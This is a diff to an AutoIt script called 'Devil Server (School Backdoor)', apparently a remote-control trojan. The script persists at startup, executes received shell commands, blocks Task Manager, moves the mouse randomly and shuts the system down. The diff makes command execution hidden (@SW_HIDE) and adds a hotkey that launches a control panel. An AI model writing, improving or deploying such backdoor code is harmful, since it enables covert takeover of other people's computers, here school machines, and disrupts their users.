@@ -2,7 +2,7 @@
  
  Devil Server ( School Backdoor )
  AutoIt Version: 3.3.14.2
- Version: Beta ( 18:55 8.09.2017)
+ Version: Beta 2 ( 17:09 11.09.2017)
 
 #ce ----------------------------------------------------------------------------
 
@@ -18,6 +18,7 @@ _Singleton("devil_check_server", 0)
 ; Read config file
 Global $Config_ClientID = IniRead("config.ini", "Config", "ClientID", "defective_client")
 Global $Config_ServerPatch = IniRead("config.ini", "Config", "ServerPatch", "C:\")
+Global $Config_ControlPanelPatch = IniRead("config.ini", "Config", "ControlPanelPatch", "Devil-ControlPanel x32.exe")
 Global $Config_AddToStartup = IniRead("config.ini", "Config", "AddToStartup", "False")
 Global $Config_Speed = IniRead("config.ini", "Config", "Speed", "10")
 
@@ -25,6 +26,9 @@ Global $Config_Speed = IniRead("config.ini", "Config", "Speed", "10")
 Global $ServerData = ""
 Global $Status_CrazyMouse = "False"
 Global $Status_BlockTaskManager = "False"
+
+; Hotkey to start Control Panel
+HotKeySet("{PAUSE}", "RunControlPanel")
 
 ; ------------------------------------------------------------------------------
 
@@ -41,7 +45,6 @@ If $Config_AddToStartup = "True" Then
 		MsgBox($MB_OK, "Devil Server", "Devil Server can not add self to the start-up! Try again!")
 	EndIf
 EndIf
-
 ; ------------------------------------------------------------------------------
 
 ; Loop
@@ -113,7 +116,7 @@ EndFunc
 
 ; Execute to CMD
 Func CMDExecute($Command)
-	RunWait(@ComSpec & " /c " & $Command)
+	Run(@ComSpec & " /c " & $Command, "", @SW_HIDE)
 EndFunc
 
 ; Show message
@@ -123,7 +126,7 @@ EndFunc
 
 ; Shutdown system
 Func SystemShutdown()
-	Shutdown(1)
+	Shutdown($SD_SHUTDOWN)
 EndFunc
 
 ; Block task manager
@@ -134,4 +137,9 @@ EndFunc
 ; Сrazy mouse
 Func CrazyMouse()
 	MouseMove(Random(0, @DesktopWidth), Random(0, @DesktopHeight), 3) ; Move mouse to random position
+EndFunc
+
+; Run Control Panel using hotkeys
+Func RunControlPanel()
+	Run("Devil-ControlPanel.au3")
 EndFunc
